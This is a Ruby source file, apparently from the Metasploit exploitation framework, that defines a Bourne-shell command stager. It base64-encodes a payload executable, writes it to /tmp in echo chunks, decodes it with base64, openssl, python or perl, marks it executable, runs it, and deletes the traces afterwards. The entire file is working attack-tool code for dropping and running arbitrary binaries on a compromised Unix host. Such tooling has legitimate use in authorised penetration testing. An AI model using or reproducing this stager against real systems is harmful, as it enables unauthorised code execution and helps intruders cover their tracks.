# -*- coding: binary -*-
##
# $Id: bourne.rb
##

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

class CmdStagerBourne < CmdStagerBase

	def initialize(exe)
		super

		@var_encoded = Rex::Text.rand_text_alpha(5)
		@var_decoded = Rex::Text.rand_text_alpha(5)
	end

	def generate(opts = {})
		opts[:temp] = opts[:temp] || '/tmp/'
		super
	end

	#
	# Override just to set the extra byte count
	#
	def generate_cmds(opts)
		# Set the start/end of the commands here (vs initialize) so we have @tempdir
		@cmd_start = "echo -n "
		@cmd_end   = ">>#{@tempdir}#{@var_encoded}.b64"
		xtra_len = @cmd_start.length + @cmd_end.length + 1
		opts.merge!({ :extra => xtra_len })
		super
	end


	#
	# Simple base64...
	#
	def encode_payload(opts)
		Rex::Text.encode_base64(@exe)
	end


	#
	# Combine the parts of the encoded file with the stuff that goes
	# before / after it.
	#
	def parts_to_commands(parts, opts)

		cmds = []
		parts.each do |p|
			cmd = ''
			cmd << @cmd_start
			cmd << p
			cmd << @cmd_end
			cmds << cmd
		end

		cmds
	end


	#
	# Generate the commands that will decode the file we just created
	#
	def generate_cmds_decoder(opts)
		case opts[:decoder]
		when 'base64'
			decoder = "base64 --decode #{@tempdir}#{@var_encoded}.b64"
		when 'openssl'
			decoder = "openssl enc -d -A -base64 -in #{@tempdir}#{@var_encoded}.b64"
		when 'python'
			decoder = "python -c 'import sys; import base64; print base64.standard_b64decode(sys.stdin.read());' < #{@tempdir}#{@var_encoded}.b64"
		when 'perl'
			decoder = "perl -MIO -e 'use MIME::Base64; while (<>) { print decode_base64($_); }' < #{@tempdir}#{@var_encoded}.b64"
		end
		decoder << " > #{@tempdir}#{@var_decoded}.bin"
		[ decoder ]
	end

	def compress_commands(cmds, opts)
		# Make it all happen
		cmds << "chmod +x #{@tempdir}#{@var_decoded}.bin"
		cmds << "#{@tempdir}#{@var_decoded}.bin"

		# Clean up after unless requested not to..
		if (not opts[:nodelete])
			cmds << "rm -f #{@tempdir}#{@var_decoded}.bin"
			cmds << "rm -f #{@tempdir}#{@var_encoded}.b64"
		end

		super
	end

	def cmd_concat_operator
		" ; "
	end

end
end
end
